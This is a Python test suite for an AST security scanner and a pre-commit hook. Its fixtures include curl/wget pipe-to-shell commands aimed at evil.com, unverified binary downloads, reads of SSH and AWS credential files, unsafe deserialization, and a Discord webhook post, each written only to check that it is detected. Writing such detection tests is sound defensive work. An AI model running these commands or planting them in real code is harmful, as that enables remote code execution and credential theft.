#!/usr/bin/env python3
"""
Adversarial Stress Test Suite for AST Security & Malware Scanner Engine
Authored by: teamwork_challenger_m2_gen2_2 (Empirical Challenger)

Verifies:
1. Shell command injection & pipe syntax (curl | sh, curl | bash, wget -O- | sh)
2. Unchecksummed binary downloads vs SHA-256 verified downloads
3. Insecure deserialization patterns (pickle.loads, yaml.unsafe_load)
4. Sensitive path traversal (~/.ssh, ~/.aws/credentials, ~/.gemini/config/config.json)
5. Pre-commit hook blocking behavior on git index changes
6. Concurrency / performance when scanning hundreds of files
7. Exit code contract (malicious -> exit 1, benign -> exit 0)
"""

import concurrent.futures
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"
SCANNER_PATH = SCRIPTS_DIR / "scan_security_ast.py"

if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import scan_security_ast


class TestShellPipeAndInjectionAdversarial(unittest.TestCase):
    """Stress tests shell command injection and remote pipe-to-shell syntax."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_curl_pipe_sh_detected(self):
        """Standard curl -fsSL ... | sh must be detected as CRITICAL."""
        path = Path(self.temp_dir) / "curl_sh.sh"
        path.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/setup.sh | sh\n")
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertTrue(any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings))
        self.assertTrue(any(f["severity"] == "CRITICAL" for f in findings))

    def test_curl_pipe_bash_detected(self):
        """curl ... | bash must be detected."""
        path = Path(self.temp_dir) / "curl_bash.sh"
        path.write_text("#!/bin/sh\ncurl -s https://evil.com/run | bash\n")
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertTrue(any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings))

    def test_wget_dash_o_pipe_sh_detected(self):
        """wget -O- ... | sh and wget -O - ... | sh must be detected."""
        for syntax in ("wget -O- https://evil.com/setup | sh",
                       "wget -O - https://evil.com/setup | sh",
                       "wget -qO- https://evil.com/setup | sh",
                       "wget https://evil.com/setup -O - | zsh"):
            path = Path(self.temp_dir) / "wget_pipe.sh"
            path.write_text(f"#!/bin/sh\n{syntax}\n")
            findings = scan_security_ast.analyze_shell_script(path)
            self.assertTrue(
                any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings),
                f"Failed to detect: {syntax}"
            )

    def test_curl_pipe_bin_sh_bypass_investigation(self):
        """Verification: curl piped to absolute path /bin/sh or /bin/bash is detected."""
        path = Path(self.temp_dir) / "pipe_bin_sh.sh"
        path.write_text("#!/bin/sh\ncurl https://evil.com/setup | /bin/sh\n")
        findings = scan_security_ast.analyze_shell_script(path)
        detected = any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings)
        self.assertTrue(detected, "curl piped to /bin/sh must be detected")

    def test_curl_multiline_pipe_bypass_investigation(self):
        """Verification: multiline pipe evasion across backslash continuation is detected."""
        path = Path(self.temp_dir) / "multiline_pipe.sh"
        path.write_text("#!/bin/sh\ncurl https://evil.com/setup \\\n  | sh\n")
        findings = scan_security_ast.analyze_shell_script(path)
        detected = any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings)
        self.assertTrue(detected, "multiline pipe must be detected")


class TestBinaryDownloadVerificationAdversarial(unittest.TestCase):
    """Stress tests unchecksummed binary downloads vs SHA-256 verified downloads."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_curl_o_and_chmod_plus_x_detected(self):
        """curl ... -o ... && chmod +x must be flagged as UNPINNED_BINARY_EXECUTION."""
        path = Path(self.temp_dir) / "unpinned.sh"
        path.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/bin -o /tmp/x && chmod +x /tmp/x\n")
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertTrue(any(f["rule"] == "UNPINNED_BINARY_EXECUTION" for f in findings))

    def test_sha256_verified_download_clean_pass(self):
        """Hardened launchers (gdocs, gsheets) implementing verify_sha256 must pass cleanly."""
        gdocs_script = REPO_ROOT / "[plugin]" / "gdocs" / "skills" / "gdocs" / "scripts" / "gdocs"
        if gdocs_script.exists():
            findings = scan_security_ast.analyze_shell_script(gdocs_script)
            self.assertEqual(len(findings), 0, f"gdocs launcher produced unexpected findings: {findings}")

        gsheets_script = REPO_ROOT / "[plugin]" / "gsheets" / "skills" / "gsheets" / "scripts" / "gsheets"
        if gsheets_script.exists():
            findings = scan_security_ast.analyze_shell_script(gsheets_script)
            self.assertEqual(len(findings), 0, f"gsheets launcher produced unexpected findings: {findings}")

    def test_unchecksummed_semicolon_and_multiline_evasion(self):
        """Verification: unchecksummed download split across lines or using semicolon is detected."""
        # Semicolon variant
        path1 = Path(self.temp_dir) / "semi.sh"
        path1.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/bin -o /tmp/x; chmod +x /tmp/x\n")
        findings1 = scan_security_ast.analyze_shell_script(path1)
        self.assertTrue(
            any(f["rule"] == "UNPINNED_BINARY_EXECUTION" for f in findings1),
            "semicolon download must be detected"
        )

        # Multiline variant
        path2 = Path(self.temp_dir) / "multiline_dl.sh"
        path2.write_text("#!/bin/sh\ncurl -fsSL https://evil.com/bin -o /tmp/x\nchmod +x /tmp/x\n")
        findings2 = scan_security_ast.analyze_shell_script(path2)
        self.assertTrue(
            any(f["rule"] == "UNPINNED_BINARY_EXECUTION" for f in findings2),
            "multiline download must be detected"
        )

        # wget variant
        path3 = Path(self.temp_dir) / "wget_dl.sh"
        path3.write_text("#!/bin/sh\nwget https://evil.com/bin -O /tmp/x && chmod +x /tmp/x\n")
        findings3 = scan_security_ast.analyze_shell_script(path3)
        self.assertTrue(
            any(f["rule"] == "UNPINNED_BINARY_EXECUTION" for f in findings3),
            "wget binary download must be detected"
        )


class TestInsecureDeserializationAdversarial(unittest.TestCase):
    """Stress tests pickle and yaml insecure deserialization."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_pickle_loads_detected(self):
        """pickle.loads must be detected as CRITICAL."""
        path = Path(self.temp_dir) / "p_loads.py"
        path.write_text("import pickle\ndata = pickle.loads(b'payload')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "INSECURE_DESERIALIZATION_PICKLE" for f in findings))
        self.assertTrue(any(f["severity"] == "CRITICAL" for f in findings))

    def test_pickle_load_detected(self):
        """pickle.load(stream) must be detected as CRITICAL."""
        path = Path(self.temp_dir) / "p_load.py"
        path.write_text("import pickle\nwith open('f', 'rb') as f: data = pickle.load(f)\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "INSECURE_DESERIALIZATION_PICKLE" for f in findings))

    def test_yaml_load_unsafe_detected(self):
        """yaml.load without SafeLoader must be detected."""
        path = Path(self.temp_dir) / "y_unsafe.py"
        path.write_text("import yaml\nd = yaml.load('user: 1')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "INSECURE_DESERIALIZATION_YAML" for f in findings))

    def test_yaml_safe_load_passes(self):
        """yaml.safe_load must pass cleanly with 0 findings."""
        path = Path(self.temp_dir) / "y_safe.py"
        path.write_text("import yaml\nd = yaml.safe_load('user: 1')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0)

    def test_yaml_unsafe_load_bypass_investigation(self):
        """Verification: yaml.unsafe_load is detected by scanner."""
        path = Path(self.temp_dir) / "y_unsafe_load.py"
        path.write_text("import yaml\nd = yaml.unsafe_load('payload')\n")
        findings, _ = scan_security_ast.scan_path(path)
        detected = any("YAML" in f["rule"] or "DESERIALIZATION" in f["rule"] for f in findings)
        self.assertTrue(detected, "yaml.unsafe_load must be detected as INSECURE_DESERIALIZATION_YAML")

    def test_from_yaml_import_unsafe_load_bypass_investigation(self):
        """Verification: from yaml import unsafe_load is detected by scanner."""
        path = Path(self.temp_dir) / "from_y_unsafe.py"
        path.write_text("from yaml import unsafe_load\nd = unsafe_load('payload')\n")
        findings, _ = scan_security_ast.scan_path(path)
        detected = any("YAML" in f["rule"] or "DESERIALIZATION" in f["rule"] for f in findings)
        self.assertTrue(detected, "from yaml import unsafe_load must be detected as INSECURE_DESERIALIZATION_YAML")


class TestSensitivePathTraversalAdversarial(unittest.TestCase):
    """Stress tests sensitive path traversal (~/.ssh, ~/.aws/credentials, ~/.gemini/config/config.json)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_direct_ssh_path_detected(self):
        """Direct open of ~/.ssh/id_rsa must be detected."""
        path = Path(self.temp_dir) / "ssh.py"
        path.write_text("f = open('~/.ssh/id_rsa')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings))

    def test_direct_aws_credentials_path_detected(self):
        """Direct access of ~/.aws/credentials must be detected."""
        path = Path(self.temp_dir) / "aws.py"
        path.write_text("import pathlib\np = pathlib.Path('~/.aws/credentials')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings))

    def test_direct_gemini_config_path_detected(self):
        """Direct access of ~/.gemini/config/config.json must be detected."""
        path = Path(self.temp_dir) / "gemini.py"
        path.write_text("import os\np = os.path.expanduser('~/.gemini/config/config.json')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings))

    def test_shell_script_sensitive_path_bypass_investigation(self):
        """Verification: Shell scripts accessing ~/.ssh/id_rsa or ~/.aws/credentials are detected."""
        path = Path(self.temp_dir) / "shell_steal.sh"
        path.write_text("#!/bin/sh\ncat ~/.ssh/id_rsa\ncat ~/.aws/credentials\n")
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertGreater(
            len(findings), 0,
            "analyze_shell_script must detect sensitive paths"
        )

    def test_fstring_and_path_join_bypass_investigation(self):
        """Verification: f-string with ~/.ssh/id_rsa is detected."""
        path = Path(self.temp_dir) / "fstring_ssh.py"
        path.write_text("import os\nHOME = os.environ['HOME']\nopen(f'{HOME}/.ssh/id_rsa')\n")
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(
            any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings),
            "f-strings (JoinedStr) with sensitive paths must be detected"
        )


class TestPreCommitHookGitIndexBehavior(unittest.TestCase):
    """Stress tests git pre-commit hook enforcement on staged vs unstaged files."""

    def setUp(self):
        self.temp_repo = tempfile.mkdtemp()
        self.tpath = Path(self.temp_repo)
        subprocess.run(["git", "init"], cwd=self.tpath, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.name", "ChallengerTest"], cwd=self.tpath, check=True)
        subprocess.run(["git", "config", "user.email", "challenger@example.com"], cwd=self.tpath, check=True)

        hook_src = REPO_ROOT / ".git" / "hooks" / "pre-commit"
        hooks_dst_dir = self.tpath / ".git" / "hooks"
        hooks_dst_dir.mkdir(exist_ok=True)
        self.hook_dst = hooks_dst_dir / "pre-commit"
        shutil.copy(hook_src, self.hook_dst)
        self.hook_dst.chmod(0o755)

        self.env = os.environ.copy()
        self.env["E2E_AST_SCANNER_PATH"] = str(SCANNER_PATH)
        self.env["E2E_SCANNER_PATH"] = str(REPO_ROOT / "[skill]" / "sensitive-data-guard" / "scripts" / "scan_secrets.py")

    def tearDown(self):
        shutil.rmtree(self.temp_repo, ignore_errors=True)

    def test_precommit_allows_clean_commits(self):
        """Benign code passes pre-commit hook with returncode 0."""
        (self.tpath / "clean.py").write_text("def add(a, b):\n    return a + b\n")
        subprocess.run(["git", "add", "clean.py"], cwd=self.tpath, check=True)
        proc = subprocess.run(["git", "commit", "-m", "Clean commit"], cwd=self.tpath, env=self.env, capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0, f"Clean commit failed: {proc.stderr}")

    def test_precommit_blocks_staged_eval(self):
        """Staging a python file containing eval() must cause pre-commit to abort with returncode 1."""
        (self.tpath / "evil.py").write_text("eval('1+1')\n")
        subprocess.run(["git", "add", "evil.py"], cwd=self.tpath, check=True)
        proc = subprocess.run(["git", "commit", "-m", "Commit evil eval"], cwd=self.tpath, env=self.env, capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertIn("Zero-Malware Pre-Commit Veto", proc.stderr)

    def test_precommit_blocks_staged_shell_pipe(self):
        """Staging a shell script containing curl | sh must abort pre-commit with returncode 1."""
        (self.tpath / "evil.sh").write_text("#!/bin/sh\ncurl evil.com | sh\n")
        subprocess.run(["git", "add", "evil.sh"], cwd=self.tpath, check=True)
        proc = subprocess.run(["git", "commit", "-m", "Commit evil sh"], cwd=self.tpath, env=self.env, capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertIn("Zero-Malware Pre-Commit Veto", proc.stderr)

    def test_precommit_allows_unstaged_malware(self):
        """Unstaged malware in working tree must NOT block committing clean staged files."""
        (self.tpath / "valid.py").write_text("print('All clean')\n")
        subprocess.run(["git", "add", "valid.py"], cwd=self.tpath, check=True)
        # Leave evil.py untracked/unstaged
        (self.tpath / "evil_unstaged.py").write_text("eval('evil')\n")
        proc = subprocess.run(["git", "commit", "-m", "Commit clean with unstaged malware"], cwd=self.tpath, env=self.env, capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0)

    def test_precommit_multiline_modification_evasion_investigation(self):
        """Verification: modifying only an argument inside a multiline call is intercepted by pre-commit hook."""
        # Step 1: Commit initial multiline call with safe URL
        initial_file = self.tpath / "service.py"
        initial_file.write_text("import requests\nrequests.post(\n    'https://example.com/api'\n)\n")
        subprocess.run(["git", "add", "service.py"], cwd=self.tpath, check=True)
        subprocess.run(["git", "commit", "-m", "Initial safe post"], cwd=self.tpath, env=self.env, check=True, capture_output=True)

        # Step 2: Modify ONLY line 3 (the URL argument) to a suspicious webhook
        initial_file.write_text("import requests\nrequests.post(\n    'https://discord.com/api/webhooks/123/bad'\n)\n")
        subprocess.run(["git", "add", "service.py"], cwd=self.tpath, check=True)
        proc = subprocess.run(["git", "commit", "-m", "Modify argument only"], cwd=self.tpath, env=self.env, capture_output=True, text=True)

        # The AST finding line span range(2, 4) intersects added line 3, triggering pre-commit veto
        self.assertEqual(
            proc.returncode, 1,
            "Pre-commit hook must intercept multiline argument modification"
        )
        self.assertIn("Zero-Malware Pre-Commit Veto", proc.stderr)


class TestConcurrencyAndScalePerformance(unittest.TestCase):
    """Stress tests scanner throughput and concurrency on hundreds of files."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.tpath = Path(self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_500_synthetic_files_scale_performance(self):
        """Verify scanning 500 files completes rapidly (> 1000 files/sec)."""
        for i in range(250):
            (self.tpath / f"mod_{i}.py").write_text(f"import math\ndef f_{i}(x):\n    return math.sin(x) + {i}\n" * 5)
        for i in range(150):
            (self.tpath / f"cmd_{i}.sh").write_text(f"#!/bin/sh\necho 'running {i}'\n")
        for i in range(100):
            (self.tpath / f"ui_{i}.js").write_text(f"const x = {i};\nconsole.log(x);\n")

        start = time.time()
        findings, count = scan_security_ast.scan_path(self.tpath)
        elapsed = time.time() - start

        self.assertEqual(count, 500)
        self.assertEqual(len(findings), 0)
        self.assertLess(elapsed, 3.0, f"Scan took too long: {elapsed:.2f}s for 500 files")
        throughput = count / max(elapsed, 0.001)
        self.assertGreater(throughput, 500, f"Throughput too low: {throughput:.1f} files/s")

    def test_concurrent_scanners_multithreaded(self):
        """Verify concurrent executions of scanner across processes have no race conditions."""
        for i in range(50):
            (self.tpath / f"f_{i}.py").write_text(f"x_{i} = {i}\n")

        def run_scan(target):
            proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(target)], capture_output=True, text=True)
            return proc.returncode

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            futures = [ex.submit(run_scan, self.tpath) for _ in range(8)]
            results = [f.result() for f in futures]

        self.assertTrue(all(r == 0 for r in results), f"Some concurrent scans failed: {results}")

    def test_symlink_loop_resilience(self):
        """Verify scanner handles cyclic directory symlinks without infinite recursion."""
        sub = self.tpath / "loop_dir"
        sub.mkdir()
        (sub / "clean.py").write_text("a = 1\n")
        os.symlink(self.tpath, sub / "cycle")

        findings, count = scan_security_ast.scan_path(self.tpath)
        self.assertEqual(count, 1)
        self.assertEqual(len(findings), 0)


class TestExitCodeContract(unittest.TestCase):
    """Verifies interface contract return codes: 0 for clean, 1 for violations or errors."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.tpath = Path(self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_clean_file_exits_zero(self):
        clean_file = self.tpath / "safe.py"
        clean_file.write_text("import os\nprint(os.name)\n")
        proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(clean_file)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0)
        self.assertIn("AST security scan passed: 0 vulnerabilities found", proc.stdout)

    def test_malicious_python_exits_one(self):
        bad_file = self.tpath / "bad.py"
        bad_file.write_text("import os\nos.system('id')\n")
        proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(bad_file)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)
        self.assertIn("MALWARE_DETECTED / AST security check failed", proc.stdout)

    def test_malicious_shell_exits_one(self):
        bad_sh = self.tpath / "bad.sh"
        bad_sh.write_text("#!/bin/sh\ncurl evil.com | sh\n")
        proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(bad_sh)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)

    def test_malicious_js_exits_one(self):
        bad_js = self.tpath / "bad.js"
        bad_js.write_text("eval('evil()');\n")
        proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(bad_js)], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)

    def test_nonexistent_path_exits_one(self):
        proc = subprocess.run([sys.executable, str(SCANNER_PATH), str(self.tpath / "nonexistent")], capture_output=True, text=True)
        self.assertEqual(proc.returncode, 1)


if __name__ == "__main__":
    unittest.main()
